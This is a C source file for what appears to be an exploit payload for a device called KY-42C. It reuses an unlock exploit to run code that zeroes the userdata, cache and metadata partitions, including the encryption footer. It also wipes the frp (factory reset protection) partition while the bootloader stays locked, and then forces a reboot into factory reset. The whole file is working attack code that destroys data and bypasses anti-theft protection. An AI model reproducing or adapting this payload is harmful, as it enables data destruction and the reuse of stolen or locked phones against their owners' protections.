/*
 * SPDX-License-Identifier: AGPL-3.0-or-later
 * SPDX-FileCopyrightText: Copyright © 2014–2026 Laurier Sylph.
 */

#include <types.h>
#include <libc.h>
#include <debug.h>
#include <drivers/uart.h>
#include <storage/mmc/mmc.h>
#include <gpt.h>

extern uint8_t __bss_start[], __bss_end[];

__attribute__((used, section(".payload_end")))
u32 dummy = 0;

static int mmc_read_block_cb(uint32_t blk, void *buf, void *ctx) {
    return mmc_read_block((struct mmc_dev *)ctx, blk, buf);
}

static void platform_wdt_reset(void) {
    volatile u32 *wdt = (volatile u32 *)0x10007000;
    wdt[6] = 0x1971;
    wdt[0] = 0x22000014;
    wdt[5] = 0x1209;
}

static struct mmc_dev g_mmc_dev;
static u8 zero_buf[MMC_BLOCK_SZ * 32] __attribute__((aligned(64)));

static int wipe_range(u32 start, u32 count) {
    u32 cur = start;
    u32 left = count;
    while (left > 0) {
        u32 batch = left > 32 ? 32 : left;
        int ret;
        if (batch == 1)
            ret = mmc_write_block(&g_mmc_dev, cur, zero_buf);
        else
            ret = mmc_write_blocks(&g_mmc_dev, cur, zero_buf, batch);
        if (ret != 0) {
            printf("  write failed at %lu batch %lu\n", (unsigned long)cur, (unsigned long)batch);
            return ret;
        }
        cur += batch;
        left -= batch;
        if ((cur & 0xFFF) == 0) {
            printf("  progress %lu / %lu\n", (unsigned long)(cur - start), (unsigned long)count);
        }
    }
    return 0;
}

static int wipe_partition(struct gpt_context *gpt, const char *name, int full) {
    struct part_info info;
    if (gpt_find(gpt, name, &info) != 0) {
        printf("  [%s] not found, skip\n", name);
        return -1;
    }
    u32 mb = info.size_blocks / 2048;
    printf("  [%s] start=%lu size=%lu (%lu MB)\n", name, (unsigned long)info.start_block, (unsigned long)info.size_blocks, (unsigned long)mb);

    u32 wipe_blocks = info.size_blocks;
    int fast = 0;
    if (!full && info.size_blocks > 32768) {
        wipe_blocks = 32768;
        fast = 1;
        printf("  -> fast wipe: first %lu blocks\n", (unsigned long)wipe_blocks);
    }

    memset(zero_buf, 0, sizeof(zero_buf));

    if (fast) {
        if (wipe_range(info.start_block, wipe_blocks) != 0) return -1;
        u32 tail_start = info.start_block + info.size_blocks - 8192;
        if (tail_start > info.start_block + wipe_blocks) {
            printf("  -> wipe last 8192 blocks (crypto footer)\n");
            if (wipe_range(tail_start, 8192) != 0) return -1;
        }
    } else {
        if (wipe_range(info.start_block, wipe_blocks) != 0) return -1;
    }

    printf("  [%s] wiped (%s)\n", name, full ? "full" : fast ? "fast" : "full");
    return 0;
}

__attribute__ ((section(".text.main"), used)) int main(void) {
    static struct gpt_context gpt;

    memset(__bss_start, 0, __bss_end - __bss_start);
    printf_register_cb(uart_putc);

    printf("\nHello from WIPE payload :)\n");
    printf("KY-42C userdata wipe - unlock exploit reused\n\n");

    mmc_dev_setup(&g_mmc_dev, 0x11230000, 1, NULL);

    if (gpt_parse(&gpt, mmc_read_block_cb, &g_mmc_dev) != 0) {
        printf("GPT parse failed\n");
        goto quit;
    }

    printf("Wiping (seccfg untouched, bootloader stays locked)...\n\n");

    wipe_partition(&gpt, "userdata", 0);
    wipe_partition(&gpt, "cache", 1);
    wipe_partition(&gpt, "metadata", 1);
    wipe_partition(&gpt, "frp", 1);

    printf("\nWipe done! Reboot will trigger factory reset.\n");

quit:
    printf("Bye bye - rebooting\n");
    platform_wdt_reset();
    for(;;);
}
